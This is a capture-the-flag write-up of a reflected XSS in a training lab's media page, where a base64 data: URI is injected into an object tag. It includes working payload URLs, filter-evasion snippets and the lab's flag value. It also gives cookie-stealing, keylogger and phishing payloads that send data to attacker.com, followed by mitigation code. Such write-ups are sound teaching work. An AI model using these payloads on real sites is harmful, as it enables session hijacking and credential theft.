# Breach #5: XSS (Cross-Site Scripting) via Media Source Parameter

## Vulnerability Type
**Reflected XSS - Data URI Injection**
- OWASP: A03:2021 - Injection
- CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)

## How We Found It

### Discovery: Media Page with src Parameter
URL: `http://192.168.64.2/index.php?page=media&src=nsa`

The homepage contains an image link to the NSA that leads to a media page with a `src` parameter.

![Normal media page with NSA image](images/01-normal-media-page.png)

### Step 1: Analyzing the HTML Structure
When accessing the media page, we inspected the HTML:

```html
<object data="http://192.168.64.2/images/nsa_prism.jpg"></object>
```

**Key Observation**: The `src` parameter value is directly inserted into the `data` attribute of an `<object>` tag without sanitization.

### Step 2: Testing Parameter Manipulation
We modified the `src` parameter to see if it's vulnerable:

**Test 1** - Path Traversal:
```
http://192.168.64.2/index.php?page=media&src=/
```
Result: Embedded the root page inside the object tag ✅

**Test 2** - Invalid Source:
```
http://192.168.64.2/index.php?page=media&src=test123
```
Result: `<object data="test123"></object>` ✅

**Conclusion**: User input is **directly reflected** in the HTML without validation!

### Step 3: Data URI Research
From MDN documentation, we learned about **Data URIs**:

**Data URI Format**:
```
data:[<mediatype>][;base64],<data>
```

**Examples**:
- Image: `data:image/png;base64,iVBORw0KGgo...`
- HTML: `data:text/html,<h1>Hello</h1>`
- JavaScript: `data:text/html,<script>alert(1)</script>`

The `<object>` tag's `data` attribute accepts **any valid URL**, including Data URIs!

### Step 4: XSS Payload Construction

**Simple XSS Payload**:
```html
<script>alert("XSS")</script>
```

**Base64 Encoding**:
```bash
echo -n '<script>alert("XSS")</script>' | base64
# Output: PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

![Base64 encoding process in terminal](images/03-base64-encoding.png)

**Final Data URI**:
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

### Step 5: Exploitation
**Malicious URL**:
```
http://192.168.64.2/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

![XSS payload execution showing flag](images/02-xss-flag.png)

**Result**: ✅ JavaScript executed and Flag revealed!

**Flag**: `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

## How to Exploit

### Method 1: Direct URL Access
Simply visit the crafted URL:
```
http://192.168.64.2/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=
```

### Method 2: Encoded HTML (Without Base64)
```
http://192.168.64.2/index.php?page=media&src=data:text/html,%3Cscript%3Ealert('XSS')%3C/script%3E
```

Note: URL encoding `<script>` → `%3Cscript%3E`

### Method 3: Browser Console Verification

You can verify JavaScript execution using browser DevTools:

1. Visit the media page: `http://192.168.64.2/index.php?page=media&src=nsa`
2. Open DevTools: `F12` (Windows/Linux) or `Cmd+Option+I` (Mac)
3. Go to **Console** tab
4. Type: `alert("XSS")`
5. Press **Enter**

![Alert popup demonstration in browser](images/04-alert-popup-demo.png)

**Result**: A popup alert appears saying "192.168.64.2 says: XSS"

This demonstrates that:
- JavaScript can execute in the page context
- The browser environment is vulnerable to XSS
- `alert()` is a standard proof-of-concept for XSS testing

**Note**: In some cases, when accessing the malicious Data URI directly, the server may detect the XSS attempt and redirect to the flag page immediately without showing the alert popup. This is still valid proof of XSS vulnerability.

### Method 4: Various Payloads

**Display Custom Content**:
```html
<!-- Payload -->
<h1 style="color:red">XSS Works!</h1>

<!-- Base64 -->
PGgxIHN0eWxlPSJjb2xvcjpyZWQiPlhTUyBXb3JrcyE8L2gxPg==

<!-- URL -->
http://192.168.64.2/index.php?page=media&src=data:text/html;base64,PGgxIHN0eWxlPSJjb2xvcjpyZWQiPlhTUyBXb3JrcyE8L2gxPg==
```

**Cookie Stealing**:
```html
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie;
</script>
```

**Keylogger**:
```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
};
</script>
```

**Phishing Page**:
```html
<form action="http://attacker.com/phish" method="POST">
    Username: <input name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit">
</form>
```

### Method 5: OWASP XSS Filter Evasion

From [OWASP XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet):

```html
<!-- IMG tag XSS -->
<img src=x onerror=alert('XSS')>

<!-- SVG XSS -->
<svg/onload=alert('XSS')>

<!-- Body tag XSS -->
<body onload=alert('XSS')>

<!-- IFrame XSS -->
<iframe src="javascript:alert('XSS')">
```

All can be encoded in Base64 and injected via Data URI!

## Security Issues

### 1. No Input Validation
**Problem**: The `src` parameter accepts **any** value without validation.

**Vulnerable Code** (hypothetical):
```php
$src = $_GET['src'];
echo "<object data=\"$src\"></object>";
```

**No checks for**:
- Valid file paths
- Allowed protocols (http, https only)
- Dangerous protocols (javascript:, data:)
- File extensions
- Content type

### 2. Direct Reflection in HTML
**Problem**: User input is directly inserted into HTML without encoding.

**Attack Flow**:
```
User Input: data:text/html,<script>alert(1)</script>
    ↓
Server Code: echo "<object data=\"" . $_GET['src'] . "\"></object>"
    ↓
HTML Output: <object data="data:text/html,<script>alert(1)</script>"></object>
    ↓
Browser: Executes JavaScript!
```

### 3. Allowing Data URIs
**Problem**: Data URIs can embed executable code directly in the URL.

**Why it's dangerous**:
- No external file needed
- Bypasses Content Security Policy (in some cases)
- Can contain any HTML/JavaScript
- Hard to detect by URL filtering

**Data URI Structure**:
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
     ↑         ↑       ↑
  MIME type  Encoding  Payload (base64)
```

### 4. Object Tag Accepts JavaScript
**Problem**: The `<object>` tag can load and execute JavaScript.

**Dangerous attributes**:
```html
<object data="javascript:alert(1)"></object>
<object data="data:text/html,<script>alert(1)</script>"></object>
```

Both execute JavaScript in the browser!

### 5. No Content Security Policy (CSP)
**Problem**: No CSP headers to restrict what can be loaded.

**Missing headers**:
```
Content-Security-Policy: default-src 'self'
Content-Security-Policy: object-src 'none'
X-XSS-Protection: 1; mode=block
```

## Real-World Attack Scenarios

### Scenario 1: Cookie Theft
**Attacker sends victim**:
```
http://192.168.64.2/?page=media&src=data:text/html;base64,[evil_payload]
```

**Payload** (decoded):
```javascript
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        session: localStorage.getItem('session'),
        url: window.location.href
    })
});
</script>
```

**Result**: Attacker steals victim's session cookies and can impersonate them!

### Scenario 2: Phishing Attack
**Payload** (decoded):
```html
<style>
body { font-family: Arial; margin: 50px; }
.login { width: 300px; padding: 20px; border: 1px solid #ccc; }
</style>
<div class="login">
    <h2>Session Expired - Please Login Again</h2>
    <form action="https://attacker.com/phish" method="POST">
        Username: <input name="user" required><br><br>
        Password: <input type="password" name="pass" required><br><br>
        <button type="submit">Login</button>
    </form>
</div>
```

**Result**: Victim enters credentials, which are sent to attacker's server!

### Scenario 3: Keylogger
**Payload** (decoded):
```javascript
<script>
let keys = '';
document.onkeypress = function(e) {
    keys += e.key;
    if (keys.length > 10) {
        fetch('https://attacker.com/log?data=' + btoa(keys));
        keys = '';
    }
};
</script>
<h1>Welcome! Please continue browsing...</h1>
```

**Result**: Every keystroke is logged and sent to attacker!

## Mitigation

### 1. Implement Strict Input Validation

**Whitelist Approach**:
```php
// Define allowed sources
$allowed_sources = [
    'nsa' => 'images/nsa_prism.jpg',
    'logo' => 'images/logo.png',
    'banner' => 'images/banner.jpg'
];

$src = $_GET['src'] ?? 'nsa';

// Validate against whitelist
if (!array_key_exists($src, $allowed_sources)) {
    die("Invalid source");
}

$file_path = $allowed_sources[$src];

echo "<object data=\"" . htmlspecialchars($file_path, ENT_QUOTES, 'UTF-8') . "\"></object>";
```

**Benefits**:
- ✅ Only predefined sources allowed
- ✅ No user-controlled paths
- ✅ No Data URIs possible

### 2. Output Encoding

**Always use htmlspecialchars**:
```php
// ❌ Bad
echo "<object data=\"$src\"></object>";

// ✅ Good
echo "<object data=\"" . htmlspecialchars($src, ENT_QUOTES, 'UTF-8') . "\"></object>";
```

**What htmlspecialchars does**:
```
Input:  data:text/html,<script>alert(1)</script>
Output: data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
        (Browser displays as text, doesn't execute)
```

### 3. Content Security Policy (CSP)

**HTTP Headers**:
```apache
# Apache configuration
Header set Content-Security-Policy "default-src 'self'; object-src 'none'; script-src 'self'"
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "DENY"
Header set X-XSS-Protection "1; mode=block"
```

**What each directive does**:
- `default-src 'self'`: Only load resources from same origin
- `object-src 'none'`: Block all `<object>`, `<embed>`, `<applet>` tags
- `script-src 'self'`: Only execute scripts from same origin
- No Data URIs allowed!

### 4. Protocol Whitelisting

**Block dangerous protocols**:
```php
function validateURL($url) {
    $parsed = parse_url($url);

    if (!$parsed || !isset($parsed['scheme'])) {
        return false;
    }

    // Only allow HTTP and HTTPS
    $allowed_protocols = ['http', 'https'];

    if (!in_array(strtolower($parsed['scheme']), $allowed_protocols)) {
        return false;
    }

    return true;
}

$src = $_GET['src'];

if (!validateURL($src)) {
    die("Invalid protocol");
}
```

**Blocked protocols**:
- `javascript:` - Direct JavaScript execution
- `data:` - Data URIs
- `file:` - Local file access
- `vbscript:` - VBScript execution

### 5. Use img Tag Instead of object

**Safer alternative**:
```php
// Instead of <object>
echo "<object data=\"$src\"></object>";

// Use <img> which doesn't execute JavaScript
echo "<img src=\"" . htmlspecialchars($src, ENT_QUOTES) . "\" alt=\"Media\">";
```

**Why img is safer**:
- Can't execute JavaScript directly
- Only accepts image formats
- Browser validates image headers

### 6. Implement CSP with Nonce

**Generate random nonce**:
```php
$nonce = base64_encode(random_bytes(16));

header("Content-Security-Policy: script-src 'nonce-$nonce'");
```

**Use in HTML**:
```html
<!-- Only scripts with matching nonce execute -->
<script nonce="<?php echo $nonce; ?>">
    // This script will execute
    console.log("Allowed");
</script>

<script>
    // This script will be blocked
    alert("Blocked");
</script>
```

## Impact Assessment

### CVSS 3.1 Score: 7.1 (High)

**Attack Vector**: Network (AV:N)
**Attack Complexity**: Low (AC:L)
**Privileges Required**: None (PR:N)
**User Interaction**: Required (UI:R) - Victim must click malicious link
**Scope**: Changed (S:C) - Can affect other users
**Confidentiality**: High (C:H) - Steal cookies, session tokens
**Integrity**: Low (I:L) - Can modify page content
**Availability**: None (A:N)

### Real-World Impact

**Successful XSS enables**:
- Session hijacking
- Cookie theft
- Phishing attacks
- Keylogging
- Malware distribution
- Account takeover
- Data exfiltration

**Statistics**:
- XSS found in **40%** of web applications (OWASP)
- Average time to discover: 200 days
- Average cost of XSS breach: $3.9M (IBM, 2023)

## References

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [MDN Data URLs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

## Tools Used

- **Browser DevTools**: Inspect HTML structure
- **curl**: Command-line testing
- **base64**: Encode payloads
- **Burp Suite**: (Optional) Intercept and modify requests

---
**Flag**: `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`
